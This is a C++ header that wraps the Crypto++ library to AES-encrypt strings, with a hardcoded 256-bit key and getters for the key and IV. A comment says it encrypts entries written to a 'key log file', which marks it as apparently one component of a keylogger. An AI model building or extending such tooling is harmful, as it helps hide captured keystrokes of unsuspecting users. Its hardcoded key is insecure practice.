#ifndef TRANSFORMER_H
#define TRANSFORMER_H

#include <vector>
#include <string>
#include "cryptlib.h"
#include "rijndael.h"
#include "modes.h"
#include "files.h"
#include "osrng.h"
#include "hex.h"

namespace Transformer
{
	//AES Encryption Groundwork | AES-256 keys will be used

	//This key must be changed before each deployment
	std::string keyStr = "6E5A7234743777217A25432A462D4A614E645267556B58703273357638782F41";

	static constexpr size_t AES_KEY_SIZE = 256 / 8;
	std::vector<uint8_t> key(AES_KEY_SIZE);	

	std::vector<uint8_t> iv(CryptoPP::AES::BLOCKSIZE);
	
	CryptoPP::AutoSeededRandomPool randNumGen;

	std::vector<uint8_t> hexStringToByteArray(std::string hex);

	/* The functions below will make use of the publicly available Crypto++ library
	to encrypt the strings that make it to the key log file and return the keys/ivs.

	Instructions: 
	
	Compilation/Linking -> https://www.ired.team/miscellaneous-reversing-forensics/aes-encryption-example-using-cryptopp-.lib-in-visual-studio-c++ 
	Encryption/Decryption -> https://petanode.com/posts/brief-introduction-to-cryptopp/
	Key/IV Retrieval -> https://www.cryptopp.com/wiki/HMAC

	*/

	std::string aesEncrypt(std::string plainText)
	{
		//Can't securley transfer decryption key, so I will just make the user preset it b4 compilation
		//randNumGen.GenerateBlock(key.data(), key.size());

		key = hexStringToByteArray(keyStr);
		randNumGen.GenerateBlock(iv.data(), iv.size());

		auto aesData = CryptoPP::AES::Encryption(key.data(), key.size());
		auto cbcData = CryptoPP::CBC_Mode_ExternalCipher::Encryption(aesData, iv.data());
		std::string cipherText;

		CryptoPP::StringSource(plainText, true,
			new CryptoPP::StreamTransformationFilter(cbcData,
				new CryptoPP::HexEncoder(
					new CryptoPP::StringSink(cipherText)
					)
				)
			);

		return cipherText;
	}

	std::string byteArrayToHexString(std::vector<uint8_t> &vector)
	{
		std::string hexEncoded;
		hexEncoded.clear();
		
		CryptoPP::StringSource sourceOne(vector.data(), vector.size(), true,
			new CryptoPP::HexEncoder(
				new CryptoPP::StringSink(hexEncoded)
				)
			);

		return hexEncoded;
	}
	
	std::string getEncryptionKey()
	{
		return keyStr;
	}
	
	std::string getIV()
	{
		return byteArrayToHexString(iv);
	}

	//Source: https://stackoverflow.com/questions/17261798/converting-a-hex-string-to-a-byte-array

	std::vector<uint8_t> hexStringToByteArray(std::string hex)
	{
			std::vector<uint8_t> byteArray;

			for (unsigned int i = 0; i < hex.length(); i += 2) {
				std::string byteString = hex.substr(i, 2);
				char byte = (char)strtol(byteString.c_str(), NULL, 16);
				byteArray.push_back(byte);
			}

			return byteArray;
		
	}
}

#endif // !TRANSFORMER_H